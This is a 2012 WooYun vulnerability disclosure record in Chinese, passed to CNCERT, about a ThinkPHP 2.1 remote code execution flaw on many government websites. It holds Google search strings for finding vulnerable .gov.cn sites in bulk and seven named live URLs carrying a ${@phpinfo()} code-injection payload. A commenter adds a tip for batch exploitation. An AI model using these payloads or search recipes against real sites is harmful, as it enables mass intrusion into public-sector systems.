{"id": 19077, "wybug_id": "wooyun-2012-07708", "wybug_title": "大量政府站远程代码执行", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "风萧萧", "wybug_date": "2012-05-30 21:57", "wybug_open_date": "2012-07-14 21:57", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方框架", "远程代码执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-05-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-06-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-06-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-06-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-07-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-07-14：\t细节向公众公开  简要描述： 话说最近远程代码执行很火，日拿千站不是梦想 详细说明：  thinkphp的漏洞，ThinkPHP framework 任意代码执行漏洞预警传送门\nhttp://zone.wooyun.org/index.php?do=view&id=44\n配合google查询，真的可以说日拿千站1. thinkphp加载模块出错的时候会报：\n\"系统发生错误\"\n\n\"您可以选择 [ 重试 ] [ 返回 ] 或者 [ 回到首页 ]\"\n\n\"ThinkPHP 2.1 { Fast & Simple OOP PHP Framework } -- [ WE CAN DO IT JUST THINK IT ]\"\n，如下图：\n\n2. 根据经验，貌似只有ThinkPHP 2.1会受影响（未验证），因此可以google如下关键字：\nsite:.gov.cn 系统发生错误 2.1\n或者\nsite:.gov.cn WE CAN DO IT JUST THINK IT 2.1\n等等，查询出来的政府站基本都是有问题的。3.给出受影响的站点链接如下：\nhttp://www.fscctz.gov.cn/index.php/module/action/param1/$%7B@phpinfo()%7D\n\nhttp://www.jtxwbb.gov.cn/index.php/module/action/param1/$%7B@phpinfo()%7D\n\nhttp://www.gxyzs.gov.cn/index.php/module/action/param1/$%7B@phpinfo()%7D\n\nhttp://gaokao.fjedu.gov.cn/ztc/index.php/module/action/param1/$%7B@phpinfo()%7D\n\nhttp://www.msghj.gov.cn/index.php/module/action/param1/$%7B@phpinfo()%7D\n\nhttp://www.tszsj.gov.cn/index.php/module/action/param1/$%7B@phpinfo()%7D\n\nhttp://www.gdofa.gov.cn/index.php/module/action/param1/$%7B@phpinfo()%7D\n   漏洞证明：  为了方便开发者，google也提供了API借口\nhttps://developers.google.com/custom-search/v1/cse/list\n本来是要开发完代码再发的，不过这段时间确实很忙啊，还是算了。截一个图作为漏洞证明吧：\n\n   修复方案：  及时补丁   版权声明：转载请注明来源 风萧萧@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2012-06-04 11:25 厂商回复： CNVD确认并复现所述所有情况，对于部分省市级政府部门网站会由CNCERT当地分中心（如：福建、广东等）协调涉事单位处置。参考此前对通用软件漏洞事件的评分原则，根据网站对应主管部门级别及业务应用重要程度，rank 11（有高考网站） 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-05-30 22:11 |    \t\t我了个去 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:14        | 4892057@qq.com                          ...)\t\t \n  坐等真相    \n     2012-05-30 22:34 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  大家都这么生猛，往后一些软件厂商、开源开发方情何以堪。    \n     2012-05-30 22:49 |    \t\t冰锋刺客 \t\t\t( 普通白帽子  |\t\t\t        Rank:113 漏洞数:14        | 请在监护人陪同下与本人交流)\t\t \n  坐等内容    \n     2012-05-30 23:32 |    \t\tValo洛洛 \t\t\t( 普通白帽子  |\t\t\t        Rank:458 漏洞数:52        | 。)\t\t \n  mark    \n     2012-05-31 08:37 |    \t\t陌路 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:5        | 安全爱好者！)\t\t \n  很正常     \n     2012-06-28 17:02 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  不膜拜都不行    \n     2012-07-14 23:06 |    \t\tw5r2 \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:52        )\t\t \n  其实 这个的方法很简单，批量的时候大家可以直接这样，http://www.baidu.com/index.php//xx/xx/xx/$%7B@phpinfo()%7D,不说大家都懂。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}